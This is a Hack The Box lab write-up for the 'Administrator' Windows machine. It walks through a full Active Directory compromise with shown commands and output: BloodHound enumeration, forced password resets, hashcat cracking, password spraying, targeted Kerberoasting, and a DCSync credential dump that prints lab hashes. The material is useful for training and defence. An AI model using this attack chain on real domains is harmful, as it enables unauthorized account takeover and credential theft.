---
title: 'Administrator'
date: '2026-09-22'
excerpt: 'Medium - Windows (AD Exploitation)'
prog: 'Hack The Box Machines - September 2026'
type: 'machines'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hack The Box</div>
<h1 class="writeup-title">Administrator</h1>
<div class="writeup-date">September 2026 &middot; Machines</div>
</div>
</div>
<p class="lead mb-4">Administrator is a medium-difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. To gain access to the michael account, ACLs (Access Control Lists) over privileged objects are enumerated, leading us to discover that the user olivia has GenericAll permissions over michael, allowing us to reset his password. With access as michael, it is revealed that he can force a password change on the user benjamin, whose password is reset. This grants access to FTP where a backup.psafe3 file is discovered, cracked, and reveals credentials for several users. These credentials are sprayed across the domain, revealing valid credentials for the user emily. Further enumeration shows that emily has GenericWrite permissions over the user ethan, allowing us to perform a targeted Kerberoasting attack. The recovered hash is cracked and reveals valid credentials for ethan, who is found to have DCSync rights ultimately allowing retrieval of the Administrator account hash and full domain compromise.
<br /><br />
As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich</p>


<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> What is the lowest TCP port listening on Administrator?</p>
<p class="mb-3">We begin with a Nmap scan.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ nmap -sC -sV -A 10.129.21.125 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-21 23:00 EDT
Nmap scan report for 10.129.21.125
Host is up (0.19s latency).
Not shown: 986 closed tcp ports (conn-refused)
PORT     STATE    SERVICE       VERSION
21/tcp   open     ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open     domain        Simple DNS Plus
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-22 10:10:27Z)
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open     microsoft-ds?
464/tcp  open     kpasswd5?
593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
616/tcp  filtered sco-sysmgr
636/tcp  open     tcpwrapped
3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open     tcpwrapped
5985/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h08m04s
| smb2-time: 
|   date: 2026-09-22T10:10:53
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 208.83 seconds
```

<p class="mb-3">We also need to add the DNS entry to the <code>/etc/hosts</code> file.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ echo "10.129.21.125 administrator.htb" | sudo tee -a /etc/hosts
10.129.21.125 administrator.htb
```

<p class="mb-5"><strong>Answer:</strong> 21</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> What permission does the Olivia user have over the Michael user (as shown by BloodHound)?</p>
<p class="mb-3">We first need to create a Python virtual environment by running <code>python3 -m venv htb</code>. Then we activate the virtual environment by running <code>source htb/bin/activate</code>. Inside the virtual environment, we run <code>pip install --upgrade pip</code> and then <code>pip install bloodhound-python</code>. We also need to run <code>sudo ntpdate [TARGET_IP]</code> to sync our local clock with the target's Active Directory Domain Controller's clock.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ python3 -m venv htb
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ source htb/bin/activate
(htb) ┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ pip install --upgrade pip
Requirement already satisfied: pip in ./htb/lib/python3.13/site-packages (25.1.1)
Collecting pip
  Downloading pip-26.2.1-py3-none-any.whl.metadata (4.6 kB)
Downloading pip-26.2.1-py3-none-any.whl (1.8 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.8/1.8 MB 101.5 MB/s eta 0:00:00
Installing collected packages: pip
  Attempting uninstall: pip
    Found existing installation: pip 25.1.1
    Uninstalling pip-25.1.1:
      Successfully uninstalled pip-25.1.1
Successfully installed pip-26.2.1
(htb) ┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ pip install bloodhound-python
Collecting bloodhound-python
  Downloading bloodhound_python-0.2.0-py3-none-any.whl.metadata (2.6 kB)
Downloading bloodhound_python-0.2.0-py3-none-any.whl (3.9 kB)
Installing collected packages: bloodhound-python
Successfully installed bloodhound-python-0.2.0
(htb) ┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ sudo ntpdate 10.129.21.125
ntpdig: no eligible servers
(htb) ┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ sudo ntpdate administrator.htb
2026-09-22 06:22:08.649166 (-0400) +25685.030604 +/- 0.099307 administrator.htb 10.129.21.125 s1 no-leap
CLOCK: time stepped by 25685.030604
```

<p class="mb-3">Now we can run bloodhound-python to remotely collect data and save as a zip file.</p>

```console
(htb) ┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ bloodhound-python -u olivia -p 'ichliebedich' -d administrator.htb -ns 10.129.21.125 -c All --dns-tcp --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
[...]
INFO: Done in 01M 46S
INFO: Compressing output into 20260922062611_bloodhound.zip
```

<p class="mb-3">If the Bloodhound service has not yet started, running any Bloodhound commands such as <code>bloodhound -h</code> will start up the service. Once the service is ready, we login using the default credentials <code>neo4j</code>:<code>neo4j</code> in the web browser. Then we upload the <code>yyyymmddhhmmss_bloodhound.zip</code> file created earlier.</p>
<p class="mb-3">To search for the relationship between Olivia and Michael, we enable Pathfinding, and enter <code>OLIVIA@ADMINISTRATOR.HTB</code> into the starting point and <code>MICHAEL@ADMINISTRATOR.HTB</code> as the destination point. This will show that Olivia has the <code>GenericAll</code> permission over Michael.</p>

![Administrator1](/images/administrator_hackthebox_image1.png)

<p class="mb-3">Clicking on the Help option of the edge between Olivia and Michael shows that a 'Force Change Password' action can be performed on Michael. We will use Evil-WinRM to change Michael's password to <code>michael123</code> and include the <code>/domain</code> flag.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ evil-winrm -i 10.129.21.125 -u olivia -p 'ichliebedich'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents> net user michael michael123 /domain
The command completed successfully.
```

<p class="mb-5"><strong>Answer:</strong> GenericAll</p>
<br />


<p class="mb-2"><strong>Question 3:</strong> What permission does the Michael user have on the Benjamin user?</p>
<p class="mb-3">In Bloodhound, setting <code>MICHAEL@ADMINISTRATOR.HTB</code> as the starting point and <code>BENJAMIN@ADMINISTRATOR.HTB</code> as the destination in the pathfinding option reveals the permission <code>ForceChangePassword</code>.</p>
<p class="mb-5"><strong>Answer:</strong> ForceChangePassword</p>
<br />


<p class="mb-2"><strong>Question 4:</strong> What is the name of a non-default group that Benjamin is a part of?</p>
<p class="mb-3">We disable the pathfinding option and do a search for <code>BENJAMIN@ADMINISTRATOR.HTB</code>. Then in the Node Info tab, we click on Transitive Object Control.</p>

![Administrator2](/images/administrator_hackthebox_image2.png)

<p class="mb-3">We can see that Benjamin is a part of the Share Moderators group.</p>
<p class="mb-5"><strong>Answer:</strong> Share Moderators</p>
<br />


<p class="mb-2"><strong>Question 5:</strong> What is the Master Password for Backup.psafe3?</p>
<p class="mb-3">Since Michael has the capability to change Benjamin's password, we leverage this to update Benjamin's password to <code>benjamin123</code> once we are logged in via Evil-WinRM.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ evil-winrm -i 10.129.21.125 -u michael -p 'michael123'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\michael\Documents> upload PowerView.ps1
                                        
Info: Uploading /home/aaronamran/PowerView.ps1 to C:\Users\michael\Documents\PowerView.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\michael\Documents> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\michael\Documents> $securePassword = ConvertTo-SecureString "benjamin123" -AsPlainText -Force
*Evil-WinRM* PS C:\Users\michael\Documents> Set-DomainUserPassword -Identity benjamin -AccountPassword $securePassword
*Evil-WinRM* PS C:\Users\michael\Documents> 
```

<p class="mb-3">Now we can login to the target's FTP as Benjamin with the new password.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ ftp benjamin@10.129.21.125
Connected to 10.129.21.125.
220 Microsoft FTP Service
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||51402|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||51403|)
125 Data connection already open; Transfer starting.
100% |**********************************************************************************************************|   952        3.42 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (0.93 KiB/s)
ftp> exit
221 Goodbye.
```

<p class="mb-3">We discovered and downloaded a <code>Backup.psafe3</code> file. It is a password safe database used by the Password Safe application to store passwords and other sensitive data securely using encryption. We crack this file using Hashcat with the <code>rockyou.txt</code> wordlist.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz 
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.1 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC 9575F 64-Core Processor, 3920/7905 MB (988 MB allocatable), 4MCU

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================================
* Device #2: cpu-skylake-avx512-AMD EPYC 9575F 64-Core Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

ATTENTION! Potfile storage is disabled for this hash mode.
Passwords cracked during this session will NOT be stored to the potfile.
Consider using -o to save cracked passwords.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

Backup.psafe3:tekieromucho                                
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
Hash.Target......: Backup.psafe3
Time.Started.....: Tue Sep 22 09:02:40 2026 (1 sec)
Time.Estimated...: Tue Sep 22 09:02:41 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    58492 H/s (6.71ms) @ Accel:512 Loops:512 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2048-2049
Candidate.Engine.: Device Generator
Candidates.#1....: newzealand -> iheartyou

Started: Tue Sep 22 09:02:29 2026
Stopped: Tue Sep 22 09:02:41 2026
```

<p class="mb-5"><strong>Answer:</strong> tekieromucho</p>
<br />


<p class="mb-2"><strong>Question 6:</strong> What is the Emily user's password on Administrator?</p>
<p class="mb-3">To view the contents of the <code>Backup.psafe3</code> file, we need to install Password Safe by running <code>sudo apt install passwordsafe -y</code>. Once it is installed, we open the file by running <code>pwsafe Backup.psafe3</code> and enter the password <code>tekieromucho</code>. We find the following information:</p>

```txt
Full Name       Username    Password
Alexander Smith alexander   UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
Emily Rodriguez emily       UXLCI5iETUsIBoFVTj8yQFKoHjXmb
Emma Johnson    emma        WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

<p class="mb-5"><strong>Answer:</strong> UXLCI5iETUsIBoFVTj8yQFKoHjXmb</p>
<br />


<p class="mb-2"><strong>Question 7:</strong> Submit the flag located in the Emily user's home directory.</p>
<p class="mb-3">From the information discovered earlier, we need to test out which of the credentials are valid. We can use Netexec to test out the passwords, but we need to save the usernames and passwords into separate text files.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ vi users.txt
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ vi passwords.txt
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ netexec smb 10.129.21.125 -u users.txt -p passwords.txt
SMB         10.129.21.125   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.21.125   445    DC               [-] administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
SMB         10.129.21.125   445    DC               [-] administrator.htb\emily:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw The NETBIOS connection with the remote host timed out.
SMB         10.129.21.125   445    DC               [-] administrator.htb\emma:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
SMB         10.129.21.125   445    DC               [-] administrator.htb\alexander:UXLCI5iETUsIBoFVTj8yQFKoHjXmb STATUS_LOGON_FAILURE 
SMB         10.129.21.125   445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
```

<p class="mb-3">It turns out only Emily's credentials are valid. We then use Evil-WinRM to log in as Emily and retrieve the user flag.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ evil-winrm -i 10.129.21.125 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\emily\Desktop> dir



    Directory: C:\Users\emily\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---         9/22/2026   3:07 AM             34 user.txt


*Evil-WinRM* PS C:\Users\emily\Desktop> cat user.txt
2f782d3e039acdd99c9435e3b2be02ed
```

<p class="mb-5"><strong>Answer:</strong> 2f782d3e039acdd99c9435e3b2be02ed</p>
<br />


<p class="mb-2"><strong>Question 8:</strong> What permission does the Emily user have over the Ethan user?</p>
<p class="mb-3">Searching for pathfinding between <code>EMILY@ADMINISTRATOR.HTB</code> and <code>ETHAN@ADMINISTRATOR.HTB</code> in Bloodhound GUI shows the permission <code>GenericWrite</code>. Clicking on the Help option and reading the information under Linux Abuse reveals that a targetedKerberoast attack can be done on Ethan.</p>
<p class="mb-5"><strong>Answer:</strong> GenericWrite</p>
<br />


<p class="mb-2"><strong>Question 9:</strong> What is the Ethan user's password on Administrator?</p>
<p class="mb-3">We will use targetedKerberoast to attack Ethan. We first need to clone the exploit's repository and run it and output the file.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ git clone https://github.com/ShutdownRepo/targetedKerberoast.git
Cloning into 'targetedKerberoast'...
remote: Enumerating objects: 76, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (19/19), done.
remote: Total 76 (delta 19), reused 17 (delta 14), pack-reused 43 (from 1)
Receiving objects: 100% (76/76), 252.17 KiB | 42.03 MiB/s, done.
Resolving deltas: 100% (30/30), done.
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ cd targetedKerberoast/ && ls
kerberoastables.txt  LICENSE  README.md  requirements.txt  targetedKerberoast.py
```

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~/targetedKerberoast]
└──╼ [★]$ python3 targetedKerberoast.py --dc-ip 10.129.21.125 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -o ~/ethan.txt
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Writing hash to file for (ethan)
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~/targetedKerberoast]
└──╼ [★]$ cd && ls | grep ethan
ethan.txt
```

<p class="mb-3">Next, we use Hashcat to crack Ethan's password.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ hashcat -a 0 -m 13100 ethan.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.1 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC 9575F 64-Core Processor, 3920/7905 MB (988 MB allocatable), 4MCU

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================================
* Device #2: cpu-skylake-avx512-AMD EPYC 9575F 64-Core Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$b5a458cf7edee614e155cfb046f4fc9c$c94835350174493e4bccef1ed6c4de5dbe619a415cef04e74275b89f0d19618b866a30eb20da7f5a5e8e166028a8f738b2b4edd145a4cd8cfe0e53bdfed4ceed98b4f98903cefe6030cfd14bc2192cbf044ae581c8a9285088deab4f26913d58cbcd33ce864fad424a9364c1823a38ab547f427bcfb39aef5fbf184e4307e7a09a1e1b8b6f6f3d45937e2a7a354bb2a12b8c76c3b59809fac7f27b1eb430ed602db6333b3a0b66b0f92400e831fb88ae95dbf94efb2cb0c96e9939fba16d87afc16419c7e2885e73fdf041d7e25c97621553cee40ea0a4e64706c3162cca070e8ae6fb4dfa472e4b971bd6eba81d6a8446b77471fcc02c41a4f57fd4416be080d81e9925f9eaaaca07d296e5465823fc318b2b7d63b176a56b15750e2768621be84bc9499a6beec995ee6a116dcdcac8fd68f9b6c2b45cc6e4e21bfd084a640cf494b37de34545bf7295a4ac863fb4632be0385bacd2a940e942eff8e2fbe63dc38588cc82e9a220f124a16cc6e612dde9a5ff920f5071fd706584d5c14b8e3128e5bf7fac322071afa445758c7196576fe2f5d5f9e420c3180f321450c15419e181739b34fde62512c930f1d60553f3578a2002729beba924ba00b36f11b289f0c5b058233265515a8d9718c2a84901e19a1121d6f497680f65ae576986f21125c66d83124ab2fd959f480154fc2bce11dffbdb071da100343ba365122f621dee9379b35c61d0655427b389362a1633bbac06c3d19f8dca7607f43576d267918613807948797daca6ce865d849253b3e369e59fec0ac4de8ef58c17ae163d8981ec0964b4f4318bea31654e07cbb77467bc93b4af3d79bef8a9fc20cdd2e93b7dd6a1472ac25b2877b29eb5c2a286f50d2cc442e40a6b7fa0cf780a83d6e020bcff2f5e7063dde12e2f4917a38b20b8846af3b0bc5ad7f5ed1b99986be1cb3a75c497c78c97a64cbb6cd9891e4b1c8dfcc3abbbfea2d91ba647c63dead9de228fc32a3353bd22e28239ad83bbb652f2d2d4301908efc26d7eef9f1d76336afc78a566a703909048de944152bbb37552af18a91640b0521bf8b7f95f4844aef8ac16a73e9abb7b55dd91bd553f2499188be3fd40d794a66fd0a88e35fa351361cab9929b3633ab1b131c93704f343b8b21f038efb049486aac6862e892d763fbd10bb2a1e69427d5baa4df90e141a950a4217b1ca6231b1edf282c846702d172a490fcc72f320973a000fd2f0bf55305fd42a5bc3fb65d294bf1f6d93a6fcf30ebcf1146e4367d391dcf055ccbf10ed94e0ef478a8ea828111b98de1a06206655a10ed18f9c04b1a48247ed4acea61059e98f1ec26f78284cf1a2d94dd4e2b0f4552dc91d6b9a38dfe69b6592248f658ad262462792a2625666c14adfd706b878d654ad852480ee5973330e778aaad3461f27210099f3ff67d72d609b1b702bda05141e579bffc310e7fe38415f7d9b66c8495a7ac37122189a6a336003d6e185ec2822e9e62b8efc8637b837761dc15ef60906b1b23605ae850faa8065c0e:limpbizkit
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....065c0e
Time.Started.....: Tue Sep 22 09:41:08 2026 (0 secs)
Time.Estimated...: Tue Sep 22 09:41:08 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1221.3 kH/s (1.29ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: newzealand -> iheartyou

Started: Tue Sep 22 09:40:57 2026
Stopped: Tue Sep 22 09:41:09 2026
```

<p class="mb-3">We now have Ethan's credentials: <code>ethan</code>:<code>limpbizkit</code>.</p>
<p class="mb-5"><strong>Answer:</strong> limpbizkit</p>
<br />


<p class="mb-2"><strong>Question 10:</strong> What permission does the Ethan user have over the domain (according to Bloodhound) that will allow for a full domain takeover?</p>
<p class="mb-3">In Bloodhound GUI, we do a pathfinding search from <code>ETHAN@ADMINISTRATOR.HTB</code> to <code>DOMAIN CONTROLLERS@ADMINISTRATOR.HTB</code>.</p>

![Administrator3](/images/administrator_hackthebox_image3.png)

<p class="mb-3">Notice that Ethan has the necessary privileges to perform a DCSync attack. This technique allows us to impersonate a Domain Controller and request NTLM password hashes for domain users, including privileged accounts.</p>
<p class="mb-5"><strong>Answer:</strong> DCSync</p>
<br />


<p class="mb-2"><strong>Question 11:</strong> What is the Administrator user's NTLM hash?</p>
<p class="mb-3">We use Impacket's <code>secretsdump</code> with Ethan's credentials to run the DCSync attack.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-5niwe0fo42]─[~]
└──╼ [★]$ secretsdump.py -just-dc ADMINISTRATOR.HTB/ethan@10.129.21.125
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:f4bd30733f8bc204bd7108b121869979:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:707946581bf62041c0a4a85627b69fe7:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:00fe2ebfd2e8f56834b67befd7042fae75a38c1a4b766281e6018761f76b9707
administrator.htb\michael:aes128-cts-hmac-sha1-96:787b540413b9174771583e9c8e8c42fd
administrator.htb\michael:des-cbc-md5:5d9864da68da3bcb
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:8343c34ed28cd3cdc430e659684c7033dbad99a7a11ec06ed57877fe150eebfe
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:2628cb2a59fdf5c15771560b9c78c486
administrator.htb\benjamin:des-cbc-md5:3d0e43d38c4080ec
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
